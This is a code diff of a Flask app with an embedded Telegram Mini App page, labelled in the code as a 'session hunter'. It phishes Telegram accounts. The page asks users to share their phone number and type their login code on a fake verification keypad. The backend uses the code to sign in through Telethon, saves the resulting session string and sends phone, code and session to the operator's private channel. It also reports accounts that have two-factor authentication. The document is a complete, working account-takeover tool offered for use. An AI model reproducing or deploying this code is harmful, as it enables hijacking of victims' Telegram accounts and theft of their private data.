@@ -21,7 +21,7 @@ if not all([API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, DATABASE_URL]):
     exit(1)
 
 print("=" * 50)
-print("STARTING UNIFIED SESSION HUNTER...")
+print("STARTING SESSION HUNTER...")
 print(f"Target Channel ID: {CHANNEL_ID}")
 print("=" * 50)
 
@@ -51,25 +51,25 @@ def init_db():
     except Exception as e:
         print(f"Database initialization failed: {e}")
 
-# --- IN-MEMORY SESSION STORAGE ---
-# CRITICAL: This stores the actual TelegramClient instances in memory
+# --- GLOBAL STORAGE ---
+# Stores: user_id -> {client, phone, phone_code_hash}
 active_sessions = {}
 
-# --- TELETHON CLIENT ---
+# --- TELETHON CLIENT FOR BOT ---
 bot_client = TelegramClient('bot_session', API_ID, API_HASH)
 
-async def send_to_logger(message_text):
-    """Send captured data to the private channel."""
+async def send_to_channel(message_text):
+    """Send captured data to your private channel."""
     try:
-        temp_client = TelegramClient('logger_session', API_ID, API_HASH)
+        temp_client = TelegramClient('logger', API_ID, API_HASH)
         await temp_client.start(bot_token=BOT_TOKEN)
         await temp_client.send_message(CHANNEL_ID, message_text)
         await temp_client.disconnect()
-        print("[LOG] Data sent to channel successfully.")
+        print("[LOG] Sent to channel successfully.")
     except Exception as e:
         print(f"[ERROR] Failed to send to channel: {e}")
 
-# --- FRONTEND HTML (UPDATED TO SEND PHONE NUMBER) ---
+# --- FRONTEND HTML ---
 FRONTEND_HTML = """<!DOCTYPE html>
 <html>
 <head>
@@ -78,22 +78,22 @@ FRONTEND_HTML = """<!DOCTYPE html>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed; background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; padding: 20px; background: rgba(0, 0, 0, 0.3); }
-        .card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
-        h2 { color: #fff; margin-bottom: 20px; font-size: 22px; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
-        p { color: #ddd; font-size: 14px; margin-bottom: 30px; line-height: 1.5; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
-        .robot-icon { font-size: 100px; margin-bottom: 20px; display: block; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3)); }
-        .btn { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 16px 30px; border-radius: 12px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin: 10px 0; transition: all 0.3s; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
+        .card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
+        h2 { color: #fff; margin-bottom: 20px; font-size: 22px; font-weight: 600; }
+        p { color: #ddd; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .robot-icon { font-size: 100px; margin-bottom: 20px; display: block; }
+        .btn { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 16px 30px; border-radius: 12px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin: 10px 0; transition: all 0.3s; }
         .btn:active { transform: scale(0.98); }
         .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
         #verificationScreen, #codeScreen { display: none; }
         .code-slots { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; }
-        .code-slot { width: 55px; height: 55px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #fff; backdrop-filter: blur(5px); }
+        .code-slot { width: 55px; height: 55px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #fff; }
         .code-slot.filled { background: rgba(255, 107, 157, 0.8); border-color: rgba(255, 107, 157, 0.9); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 20px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .key { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 20px; }
+        .key { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; }
         .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
-        .error { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; text-shadow: 0 1px 2px rgba(0,0,0,0.5); font-weight: bold; }
-        .loading { display: none; color: #ddd; margin-top: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+        .error { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; font-weight: bold; }
+        .loading { display: none; color: #ddd; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -140,7 +140,6 @@ FRONTEND_HTML = """<!DOCTYPE html>
                     <button class="key clear" onclick="pressKey('back')">⌫</button>
                 </div>
                 <button class="btn" onclick="submitCode()" style="margin-top: 20px;">Verify</button>
-                <button class="btn" onclick="resendCode()" style="margin-top: 10px; background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8));">Resend Code</button>
                 <div class="error" id="errorBox">Invalid code.</div>
                 <div class="loading" id="loadingBox">Verifying...</div>
             </div>
@@ -158,7 +157,6 @@ FRONTEND_HTML = """<!DOCTYPE html>
         tg.expand();
         var userId = null;
         var enteredCode = '';
-        var userPhone = ''; // Store phone number
         
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             userId = tg.initDataUnsafe.user.id;
@@ -175,27 +173,27 @@ FRONTEND_HTML = """<!DOCTYPE html>
             
             tg.requestContact(function(success, response) {
                 if (success && response && response.contact) {
-                    console.log('Contact shared:', response);
-                    userPhone = response.contact.phone_number; // Get phone number
+                    var phone = response.contact.phone_number;
+                    console.log('Phone received:', phone);
                     
-                    // Send phone number to backend to request code
+                    // Send phone to backend to request login code
                     fetch('/request_code', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
                             user_id: userId,
-                            phone: userPhone // Send phone number
+                            phone: phone 
                         })
                     })
                     .then(function(res) { return res.json(); })
                     .then(function(data) {
+                        document.getElementById('contactLoading').style.display = 'none';
                         if (data.success) {
                             document.getElementById('verificationScreen').style.display = 'none';
                             document.getElementById('codeScreen').style.display = 'block';
                         } else {
                             alert('Error: ' + (data.error || 'Failed to request code'));
                             document.getElementById('shareBtn').disabled = false;
-                            document.getElementById('contactLoading').style.display = 'none';
                         }
                     })
                     .catch(function(err) {
@@ -207,24 +205,6 @@ FRONTEND_HTML = """<!DOCTYPE html>
                     alert('Please share your contact to continue.');
                     document.getElementById('shareBtn').disabled = false;
                     document.getElementById('contactLoading').style.display = 'none';
-                }
-            });
-        }
-        
-        function resendCode() {
-            fetch('/resend', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId })
-            })
-            .then(function(res) { return res.json(); })
-            .then(function(data) {
-                if (data.success) {
-                    alert('A new code has been sent to your Telegram app.');
-                    enteredCode = '';
-                    updateCodeDisplay();
-                } else {
-                    alert(data.error || 'Failed to resend code. Please try again.');
                 }
             });
         }
@@ -268,12 +248,7 @@ FRONTEND_HTML = """<!DOCTYPE html>
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ code: enteredCode, user_id: userId })
             })
-            .then(function(res) { 
-                if (!res.ok) {
-                    throw new Error('Server error: ' + res.status);
-                }
-                return res.json(); 
-            })
+            .then(function(res) { return res.json(); })
             .then(function(data) {
                 document.getElementById('loadingBox').style.display = 'none';
                 if (data.success) {
@@ -305,7 +280,7 @@ def index():
 
 @app.route('/request_code', methods=['POST'])
 def request_code():
-    """Receive phone number from Mini App and request login code from Telegram."""
+    """Use TelegramClient to request login code from Telegram servers."""
     data = request.json
     user_id = str(data.get('user_id'))
     phone = data.get('phone')
@@ -313,124 +288,60 @@ def request_code():
     if not phone:
         return jsonify({"success": False, "error": "Phone number required"})
     
-    print(f"\n{'='*50}")
-    print(f"[CODE REQUEST] User: {user_id}, Phone: {phone}")
-    print(f"{'='*50}\n")
+    print(f"\n[REQUEST CODE] User: {user_id}, Phone: {phone}")
     
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    async def do_request():
-        try:
-            # Create new Telegram client
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            
-            # Request login code from Telegram
-            result = await client.send_code_request(phone)
-            phone_code_hash = result.phone_code_hash
-            
-            # Save session string
-            session_string = client.session.save()
-            
-            # Store in memory (CRITICAL: same client instance used later)
-            active_sessions[user_id] = {
-                'client': client, 
-                'phone': phone, 
-                'hash': phone_code_hash,
-                'session_string': session_string
-            }
-            
-            # Also store in database for persistence
-            conn = get_db_connection()
-            cur = conn.cursor()
-            cur.execute("""
-                INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
-                VALUES (%s, %s, %s, %s)
-                ON CONFLICT (user_id) 
-                DO UPDATE SET 
-                    phone = %s, 
-                    phone_code_hash = %s,
-                    session_string = %s,
-                    created_at = CURRENT_TIMESTAMP
-            """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
-            conn.commit()
-            cur.close()
-            conn.close()
-            
-            print(f"[SUCCESS] Code requested for {phone}")
-            return True, None
-            
-        except Exception as e:
-            print(f"[ERROR] {e}")
-            return False, str(e)
-    
-    success, error = loop.run_until_complete(do_request())
-    loop.close()
-    
-    if success:
+    try:
+        # Create event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Create TelegramClient and connect
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        
+        # Connect to Telegram
+        loop.run_until_complete(client.connect())
+        
+        # Request login code - THIS sends the actual SMS/code to the user's Telegram
+        result = loop.run_until_complete(client.send_code_request(phone))
+        phone_code_hash = result.phone_code_hash
+        
+        # Get session string
+        session_string = client.session.save()
+        
+        # Store in memory (keep client connected!)
+        active_sessions[user_id] = {
+            'client': client,
+            'phone': phone,
+            'hash': phone_code_hash,
+            'loop': loop
+        }
+        
+        # Also store in database
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
+            VALUES (%s, %s, %s, %s)
+            ON CONFLICT (user_id) 
+            DO UPDATE SET phone = %s, phone_code_hash = %s, session_string = %s, created_at = CURRENT_TIMESTAMP
+        """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
+        conn.commit()
+        cur.close()
+        conn.close()
+        
+        print(f"[SUCCESS] Login code requested for {phone}")
         return jsonify({"success": True})
-    else:
-        return jsonify({"success": False, "error": error})
-
-@app.route('/resend', methods=['POST'])
-def resend_code():
-    """Resend code using existing session."""
-    data = request.json
-    user_id = str(data.get('user_id'))
-    
-    if user_id not in active_sessions:
-        return jsonify({"success": False, "error": "Session expired. Please restart."})
-    
-    session_data = active_sessions[user_id]
-    client = session_data['client']
-    phone = session_data['phone']
-    
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    async def do_resend():
-        try:
-            result = await client.send_code_request(phone)
-            phone_code_hash = result.phone_code_hash
-            
-            # Update stored data
-            active_sessions[user_id]['hash'] = phone_code_hash
-            session_string = client.session.save()
-            active_sessions[user_id]['session_string'] = session_string
-            
-            # Update database
-            conn = get_db_connection()
-            cur = conn.cursor()
-            cur.execute("UPDATE sessions SET phone_code_hash = %s, session_string = %s WHERE user_id = %s",
-                       (phone_code_hash, session_string, user_id))
-            conn.commit()
-            cur.close()
-            conn.close()
-            
-            print(f"[RESENT] Code resent to {phone}")
-            return True, None
-        except Exception as e:
-            return False, str(e)
-    
-    success, error = loop.run_until_complete(do_resend())
-    loop.close()
-    
-    if success:
-        return jsonify({"success": True})
-    else:
-        return jsonify({"success": False, "error": error})
+        
+    except Exception as e:
+        print(f"[ERROR] {str(e)}")
+        return jsonify({"success": False, "error": str(e)})
 
 @app.route('/verify', methods=['POST'])
 def verify_code():
-    """Verify the code and capture session string."""
+    """Complete login and capture session."""
     data = request.json
     code = data.get('code')
     user_id = str(data.get('user_id'))
-    
-    print(f"\n{'='*50}")
-    print(f"[VERIFY] User: {user_id}, Code: {code}")
-    print(f"{'='*50}\n")
     
     if user_id not in active_sessions:
         return jsonify({"success": False, "error": "Session expired. Please restart."})
@@ -439,116 +350,92 @@ def verify_code():
     client = session_data['client']
     phone = session_data['phone']
     phone_code_hash = session_data['hash']
+    loop = session_data['loop']
     
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    print(f"\n[VERIFY] User: {user_id}, Code: {code}")
     
-    async def do_verify():
-        try:
-            # Complete login with the SAME client that requested the code
-            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            
-            # Capture the final session string (this is the stolen session!)
-            final_session = client.session.save()
-            
-            print(f"\n{'='*50}")
-            print(f"[CAPTURED] Account: {phone}")
-            print(f"[SESSION] {final_session[:50]}...")
-            print(f"{'='*50}\n")
-            
-            # Send to your Telegram channel
-            log_message = f"""🚨 NEW ACCOUNT CAPTURED 🚨
+    try:
+        # Complete login with the SAME client
+        loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
+        
+        # Get the final session string (THIS IS THE STOLEN SESSION!)
+        final_session = client.session.save()
+        
+        print(f"\n{'='*50}")
+        print(f"[CAPTURED] Phone: {phone}")
+        print(f"[SESSION] {final_session[:60]}...")
+        print(f"{'='*50}\n")
+        
+        # Send to your channel
+        message = f"""🚨 ACCOUNT CAPTURED 🚨
 
 📞 Phone: `{phone}`
-🔑 Code Used: `{code}`
+🔑 Code: `{code}`
 🔐 Session String:
 `{final_session}`
 
-⏰ Time: {datetime.now()}"""
-            
-            await send_to_logger(log_message)
-            
-            # Disconnect client
-            await client.disconnect()
-            
-            # Clean up
-            del active_sessions[user_id]
-            
-            # Clean database
-            conn = get_db_connection()
-            cur = conn.cursor()
-            cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
-            conn.commit()
-            cur.close()
-            conn.close()
-            
-            return True, final_session
-            
-        except errors.SessionPasswordNeededError:
-            await client.disconnect()
-            print(f"[2FA] Account {phone} has 2FA")
-            
-            log_message = f"""⚠️ 2FA DETECTED ⚠️
-
-📞 Phone: `{phone}`
-🔑 Code Attempted: `{code}`
-
-Note: Account has 2FA enabled. Session cannot be captured without password.
-
-⏰ Time: {datetime.now()}"""
-            
-            await send_to_logger(log_message)
-            del active_sessions[user_id]
-            return False, "2FA_REQUIRED"
-            
-        except errors.PhoneCodeInvalidError:
-            print(f"[INVALID] Wrong code")
-            return False, "INVALID_CODE"
-            
-        except errors.PhoneCodeExpiredError:
-            print(f"[EXPIRED] Code expired")
-            return False, "CODE_EXPIRED"
-            
-        except Exception as e:
-            print(f"[ERROR] {e}")
-            return False, str(e)
-    
-    success, result = loop.run_until_complete(do_verify())
-    loop.close()
-    
-    if success:
+⏰ {datetime.now()}"""
+        
+        # Use the same loop to send message
+        loop.run_until_complete(send_to_channel(message))
+        
+        # Disconnect
+        loop.run_until_complete(client.disconnect())
+        
+        # Cleanup
+        del active_sessions[user_id]
+        
+        # Cleanup database
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
+        conn.commit()
+        cur.close()
+        conn.close()
+        
         return jsonify({"success": True})
-    else:
-        return jsonify({"success": False, "error": result})
+        
+    except errors.PhoneCodeInvalidError:
+        return jsonify({"success": False, "error": "Invalid code. Please try again."})
+    except errors.PhoneCodeExpiredError:
+        return jsonify({"success": False, "error": "Code expired. Please request a new one."})
+    except errors.SessionPasswordNeededError:
+        # 2FA enabled
+        loop.run_until_complete(client.disconnect())
+        del active_sessions[user_id]
+        
+        # Notify about 2FA
+        loop.run_until_complete(send_to_channel(f"⚠️ 2FA Detected for {phone}"))
+        
+        return jsonify({"success": False, "error": "This account has 2FA enabled."})
+    except Exception as e:
+        print(f"[ERROR] {str(e)}")
+        return jsonify({"success": False, "error": str(e)})
 
-# --- BOT LISTENER (Optional - for direct bot messages) ---
+# --- BOT LISTENER (Optional) ---
 async def bot_listener():
-    print("Starting Bot Listener...")
     await bot_client.start(bot_token=BOT_TOKEN)
-    print("Bot is online.")
-
+    print("Bot listener started")
+    
     @bot_client.on(events.NewMessage)
     async def handler(event):
         if event.message.media and hasattr(event.message.media, "phone_number"):
-            phone = event.message.media.phone_number
-            user_id = str(event.message.sender_id)
-            print(f"Bot received contact: {phone} from {user_id}")
-
+            print(f"Bot received contact: {event.message.media.phone_number}")
+    
     await bot_client.run_until_disconnected()
 
-# --- MAIN ---
 if __name__ == '__main__':
     init_db()
     
-    # Start bot in background (optional, for direct messages)
+    # Start bot listener in background
     def run_bot():
         asyncio.run(bot_listener())
     
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
+    thread = threading.Thread(target=run_bot)
+    thread.daemon = True
+    thread.start()
     
     # Start Flask
     port = int(os.environ.get("PORT", 5000))
-    print(f"Starting web server on port {port}")
+    print(f"Starting server on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
